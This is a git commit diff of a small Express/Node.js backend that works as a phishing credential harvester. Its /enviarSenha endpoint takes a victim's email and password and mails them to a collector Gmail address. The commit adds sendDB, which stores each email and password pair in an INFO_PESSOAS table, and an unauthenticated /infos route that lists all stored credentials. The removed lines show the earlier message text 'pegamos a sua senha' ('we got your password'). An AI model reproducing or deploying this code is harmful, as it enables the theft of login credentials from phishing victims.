f0b0f22430f0fa6a0c6e4674738502b74303ce16
igorLAO <igooli670@gmai.com>
2023-09-05 20:18:24 -0300

    ok

--- src/Controller/emailController.js
+++ src/Controller/emailController.js
@@ -1,23 +1,35 @@
-import transporter from "../Repository/emalRepository.js";
+import transporter, { ListInfos, sendDB } from "../Repository/emalRepository.js";
 
 import { Router } from "express";
 
 const server = Router();
 
-server.post('/enviarSenha', async (req, resp) =>{
-    const { text, subject } = req.body;
-    console.log('aaaaa1')
-        const opEmail = {
-            text: 'a senha é '+ text,
-            subject: 'pegamos a sua senha ' + subject,
-            from: 'testeFishing67@hotmail.com <testeFishing67@hotmail.com>',
-            to: ['testefishing69@gmail.com'],
-        };
-        console.log('aaaaa1')
 
-        const mailsend = await transporter.sendMail(opEmail);
-        resp.status(200).send()
-        
+server.get('/infos', async (req, resp) => {
+    let res = await ListInfos()
+    resp.send(res)
 });
+
+server.post('/enviarSenha', async (req, resp) => {
+    const { text, subject } = req.body;
+    
+    console.log('aaaaa1')
+    const opEmail = {
+        text:  text,
+        subject:  subject,
+        from: 'testeFishing67@hotmail.com <testeFishing67@hotmail.com>',
+        to: ['testefishing69@gmail.com'],
+    };
+    console.log('aaaaa1')
+
+    const mailsend = await transporter.sendMail(opEmail);
+
+    let res = await sendDB(opEmail)
+
+    resp.status(200).send()
+
+});
+
+
 
 export default server;
--- src/Repository/emalRepository.js
+++ src/Repository/emalRepository.js
@@ -1,5 +1,6 @@
 import nodemailer from 'nodemailer';
 import 'dotenv/config'
+import config from './connection.js';
 const transporter = nodemailer.createTransport({
     host: "smtp-mail.outlook.com",
     port: 587,
@@ -13,4 +14,24 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-export default transporter
+export default transporter;
+
+
+export async function sendDB(DB) {
+    let sql = `
+    INSERT INTO INFO_PESSOAS (EMAIL, SENHA)
+                VALUES( ?, ?)`;
+
+    const [resp] = await config.query(sql, [DB.subject, DB.text])
+    return resp
+};
+
+export async function ListInfos(DB) {
+    let sql = `
+    SELECT 	EMAIL 	AS Email,
+            SENHA	AS SENHA
+    FROM	INFO_PESSOAS;
+    `
+    const [resp] = await config.query(sql)
+    return resp
+};
